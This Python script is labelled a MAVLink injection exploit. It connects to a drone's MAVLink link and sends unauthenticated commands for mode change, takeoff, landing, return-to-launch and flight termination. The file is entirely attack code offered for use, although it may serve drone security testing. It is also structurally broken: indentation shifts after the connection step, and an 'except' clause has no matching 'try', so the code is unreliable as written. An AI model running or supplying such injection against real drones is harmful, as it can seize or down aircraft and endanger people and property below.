#!/usr/bin/env python3
"""
MAVLink Injection Exploit Script
Injects malicious MAVLink commands into drone communication
"""

import sys
import time
from pymavlink import mavutil

def inject_command(connection_string: str, command: str, params: list = None):
    """
    Inject a MAVLink command
    
    Args:
        connection_string: MAVLink connection string (e.g., 'udp:127.0.0.1:14550')
        command: Command to inject (e.g., 'SET_MODE', 'TAKEOFF')
        params: Command parameters
    """
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    master = connect_to_drone(connection_string, timeout=5)
    if master is None:
        return False
    print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print(f"[*] Target System: {target_system}, Component: {target_component}")
        print(f"[*] Injecting command: {command}")
        
        if command == "SET_MODE":
            # Change flight mode
            mode_id = params[0] if params else 4  # GUIDED mode
            master.mav.set_mode_send(
                target_system,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                mode_id
            )
            print(f"[+] SET_MODE command sent (mode: {mode_id})")
        
        elif command == "TAKEOFF":
            # Takeoff command
            altitude = params[0] if params else 10.0
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
                0, 0, 0, 0, 0, 0, 0, altitude
            )
            print(f"[+] TAKEOFF command sent (altitude: {altitude}m)")
        
        elif command == "LAND":
            # Land command
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_NAV_LAND,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            print("[+] LAND command sent")
        
        elif command == "RTL":
            # Return to launch
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            print("[+] RTL command sent")
        
        elif command == "FLIGHT_TERMINATION":
            # Flight termination
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
                0, 1, 0, 0, 0, 0, 0, 0
            )
            print("[+] FLIGHT_TERMINATION command sent")
        
        else:
            print(f"[-] Unknown command: {command}")
            print("[*] Available commands: SET_MODE, TAKEOFF, LAND, RTL, FLIGHT_TERMINATION")
            return False
        
        # Wait for acknowledgment
        time.sleep(1)
        msg = master.recv_match(type='COMMAND_ACK', blocking=True, timeout=2)
        if msg:
            if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                print("[+] Command accepted by vehicle")
            else:
                print(f"[-] Command rejected: {msg.result}")
        
        return True
        
    except (ConnectionError, OSError) as e:
        print(f"[-] Connection error: {e}")
        return False
    except TimeoutError as e:
        print(f"[-] Timeout waiting for acknowledgment: {e}")
        return False
    except Exception as e:
        print(f"[-] Error injecting command: {e}")
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 mavlink_inject.py <connection> <command> [params...]")
        print("Example: python3 mavlink_inject.py udp:127.0.0.1:14550 SET_MODE")
        print("Example: python3 mavlink_inject.py udp:127.0.0.1:14550 TAKEOFF 20.0")
        sys.exit(1)
    
    connection = sys.argv[1]
    command = sys.argv[2].upper()  # Normalize to uppercase
    
    # Validate command
    valid_commands = ["SET_MODE", "TAKEOFF", "LAND", "RTL", "FLIGHT_TERMINATION"]
    if command not in valid_commands:
        print(f"[-] Unknown command: {command}")
        print(f"[*] Available commands: {', '.join(valid_commands)}")
        sys.exit(1)
    
    # Parse and validate parameters
    params = None
    if len(sys.argv) > 3:
        try:
            params = []
            for p in sys.argv[3:]:
                if '.' in p:
                    params.append(float(p))
                else:
                    params.append(int(p))
        except ValueError as e:
            print(f"[-] Invalid parameter format: {e}")
            sys.exit(1)
    
    success = inject_command(connection, command, params)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
